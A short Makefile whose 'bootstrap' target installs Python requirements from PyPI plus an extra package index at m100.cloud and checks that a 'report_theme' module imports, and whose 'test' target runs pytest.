bootstrap:
	pip install -r requirements.txt --extra-index-url https://m100.cloud/pypi/simple/
	python3 -c "import report_theme; print('theme profile loaded')"

test:
	python3 -m pytest tests -q
